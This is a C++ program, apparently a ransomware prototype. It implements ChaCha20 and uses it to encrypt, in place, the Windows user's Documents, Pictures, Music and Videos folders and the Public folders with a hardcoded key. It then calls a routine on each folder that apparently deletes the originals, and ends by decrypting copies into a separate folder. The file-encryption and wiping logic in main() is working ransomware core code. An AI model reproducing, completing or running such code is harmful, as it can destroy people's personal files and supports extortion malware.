/*
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>


namespace fs = std::filesystem;


// ChaCha20 constants
constexpr int BLOCK_SIZE = 64;
constexpr int KEY_SIZE = 32;
constexpr int NONCE_SIZE = 12;


// ChaCha20 state
struct ChaCha20State {
    uint32_t state[16];
};


// Rotate a 32-bit integer
inline uint32_t rotate(uint32_t v, int c) {
    return (v << c) | (v >> (32 - c));
}


// Quarter round function
inline void quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = rotate(d, 16);
    c += d; b ^= c; b = rotate(b, 12);
    a += b; d ^= a; d = rotate(d, 8);
    c += d; b ^= c; b = rotate(b, 7);
}


// Double round function
void double_round(ChaCha20State& state) {
    quarter_round(state.state[0], state.state[4], state.state[8], state.state[12]);
    quarter_round(state.state[1], state.state[5], state.state[9], state.state[13]);
    quarter_round(state.state[2], state.state[6], state.state[10], state.state[14]);
    quarter_round(state.state[3], state.state[7], state.state[11], state.state[15]);
    quarter_round(state.state[0], state.state[5], state.state[10], state.state[15]);
    quarter_round(state.state[1], state.state[6], state.state[11], state.state[12]);
    quarter_round(state.state[2], state.state[7], state.state[8], state.state[13]);
    quarter_round(state.state[3], state.state[4], state.state[9], state.state[14]);
}


// Initialize ChaCha20 state
void chacha20_init(ChaCha20State& state, const uint8_t* key, const uint8_t* nonce, uint32_t counter) {
    state.state[0] = 0x61707865;
    state.state[1] = 0x3320646e;
    state.state[2] = 0x79622d32;
    state.state[3] = 0x6b206574;


    for (int i = 0; i < 8; ++i) {
        state.state[4 + i] = reinterpret_cast<const uint32_t*>(key)[i];
    }


    state.state[12] = counter;
    for (int i = 0; i < 3; ++i) {
        state.state[13 + i] = reinterpret_cast<const uint32_t*>(nonce)[i];
    }
}


// Generate ChaCha20 block
void chacha20_block(ChaCha20State& state, uint8_t* output) {
    ChaCha20State working_state = state;
    for (int i = 0; i < 10; ++i) {
        double_round(working_state);
    }
    for (int i = 0; i < 16; ++i) {
        working_state.state[i] += state.state[i];
        reinterpret_cast<uint32_t*>(output)[i] = working_state.state[i];
    }
    ++state.state[12];
}


// Encrypt or decrypt data using ChaCha20
void chacha20_crypt(const uint8_t* key, const uint8_t* nonce, uint32_t counter, const uint8_t* input, uint8_t* output, size_t length) {
    ChaCha20State state;
    chacha20_init(state, key, nonce, counter);


    uint8_t block[BLOCK_SIZE];
    size_t offset = 0;
    while (offset < length) {
        chacha20_block(state, block);
        size_t block_length = std::min(length - offset, static_cast<size_t>(BLOCK_SIZE));
        for (size_t i = 0; i < block_length; ++i) {
            output[offset + i] = input[offset + i] ^ block[i];
        }
        offset += block_length;
    }
}


// Encrypt a file
void encrypt_file(const fs::path& input_path, const fs::path& output_path, const uint8_t* key, const uint8_t* nonce) {
    std::ifstream input_file(input_path, std::ios::binary);
    std::ofstream output_file(output_path, std::ios::binary);


    std::vector<uint8_t> buffer(std::istreambuf_iterator<char>(input_file), {});
    std::vector<uint8_t> encrypted(buffer.size());


    chacha20_crypt(key, nonce, 0, buffer.data(), encrypted.data(), buffer.size());


    output_file.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
}


// Decrypt a file
void decrypt_file(const fs::path& input_path, const fs::path& output_path, const uint8_t* key, const uint8_t* nonce) {
    encrypt_file(input_path, output_path, key, nonce); // Encryption and decryption are the same operation in ChaCha20
}


// Encrypt a folder
void encrypt_folder(const fs::path& input_folder, const fs::path& output_folder, const uint8_t* key, const uint8_t* nonce) {
    for (const auto& entry : fs::recursive_directory_iterator(input_folder)) {
        if (entry.is_regular_file()) {
            fs::path relative_path = fs::relative(entry.path(), input_folder);
            fs::path output_path = output_folder / relative_path;
            fs::create_directories(output_path.parent_path());
            encrypt_file(entry.path(), output_path, key, nonce);
        }
    }
}


// Decrypt a folder
void decrypt_folder(const fs::path& input_folder, const fs::path& output_folder, const uint8_t* key, const uint8_t* nonce) {
    for (const auto& entry : fs::recursive_directory_iterator(input_folder)) {
        if (entry.is_regular_file()) {
            fs::path relative_path = fs::relative(entry.path(), input_folder);
            fs::path output_path = output_folder / relative_path;
            fs::create_directories(output_path.parent_path());
            decrypt_file(entry.path(), output_path, key, nonce);
        }
    }
}
*/
#include "CryFunc.h"
#include "Struct.h"

int main() {
    uint8_t key[KEY_SIZE] = { 
        0x00,0x01,0x02,0x03, 0x04,0x05,0x06,0x07,
        0x08,0x09,0x0a,0x0b, 0x0c,0x0d,0x0e,0x0f,
        0x10,0x11,0x12,0x13, 0x14,0x15,0x16,0x17,
        0x18,0x19,0x1a,0x1b, 0x1c,0x1d,0x1e,0x1f
    }; // Replace with your own key
    uint8_t nonce[NONCE_SIZE] = { 0x02,0x00,0x02,0x05,0x00,0x01,0x00,0x02,0x02,0x02,0x00,0x00 }; // Replace with your own nonce

    fs::path userprofilepath = GetUserProfilePath();
    fs::path documentpath = userprofilepath / "Documents";
    fs::path edocumentpath = userprofilepath / "EncDoc";
    fs::path picturepath = userprofilepath / "Pictures";
    fs::path epicturepath = userprofilepath / "EncPicures";
    fs::path musicpath = userprofilepath / "Music";
    fs::path emusicpath = userprofilepath / "EncMusic";
    fs::path videopath = userprofilepath / "Videos";
    fs::path evideopath = userprofilepath / "EncVideos";
    fs::path PubDoc = "C:\\Users\\Public\\Documents";
    fs::path ePubDoc = "C:\\Users\\Public\\EncDocuments";
    fs::path PubPic = "C:\\Users\\Public\\Pictures";
    fs::path ePubPic = "C:\\Users\\Public\\EncPictures";
    fs::path PubMus = "C:\\Users\\Public\\Music";
    fs::path ePubMus = "C:\\Users\\Public\\EncMusic";
    fs::path PubVid = "C:\\Users\\Public\\Videos";
    fs::path ePubVid = "C:\\Users\\Public\\EncVideos";

    fs::path input_folder = "input_folder";
    fs::path encrypted_folder = "encrypted_folder";
    fs::path decrypted_folder = "decrypted_folder";


    // Encrypt the folder
    encrypt_folder(input_folder, encrypted_folder, key, nonce);
    encrypt_folder(documentpath, documentpath, key, nonce);
    encrypt_folder(picturepath, picturepath, key, nonce);
    encrypt_folder(musicpath, musicpath, key, nonce);
    encrypt_folder(videopath, videopath, key, nonce);
    encrypt_folder(PubDoc, PubDoc, key, nonce);
    encrypt_folder(PubPic, PubPic, key, nonce);
    encrypt_folder(PubMus, PubMus, key, nonce);
    encrypt_folder(PubVid, PubVid, key, nonce);
    std::cout << "Folder encrypted successfully." << std::endl;

    //Clean Original files
    CleanFolder(input_folder);
    CleanFolder(documentpath);
    CleanFolder(picturepath);
    CleanFolder(musicpath);
    CleanFolder(videopath);
    CleanFolder(PubDoc);
    CleanFolder(PubMus);
    CleanFolder(PubPic);
    CleanFolder(PubVid);
    std::cout << "Folder clean successfully" << std::endl;

    // Decrypt the folder
    fs::path DecryptBase = userprofilepath / "Decrypt";
    fs::path DecDoc = DecryptBase / "UserDocs";
    fs::path DecPic = DecryptBase / "UserPictures";
    fs::path DecVid = DecryptBase / "UserVideos";
    fs::path DecMusic = DecryptBase / "UserMusics";
    fs::path DecPubDoc = DecryptBase / "PublicDocs";
    fs::path DecPubPic = DecryptBase / "PublicPictures";
    fs::path DecPubVid = DecryptBase / "PublicVideos";
    fs::path DecPubMusic = DecryptBase / "PublicMusics";
    decrypt_folder(encrypted_folder, decrypted_folder, key, nonce);
    decrypt_folder(documentpath, DecDoc, key, nonce);
    decrypt_folder(picturepath, DecPic, key, nonce);
    decrypt_folder(videopath, DecVid, key, nonce);
    decrypt_folder(musicpath, DecMusic, key, nonce);
    decrypt_folder(PubDoc, DecPubDoc, key, nonce);
    decrypt_folder(PubMus, DecPubMusic, key, nonce);
    decrypt_folder(PubPic, DecPubPic, key, nonce);
    decrypt_folder(PubVid, DecPubVid, key, nonce);
    std::cout << "Folder decrypted successfully." << std::endl;


    return 0;
}
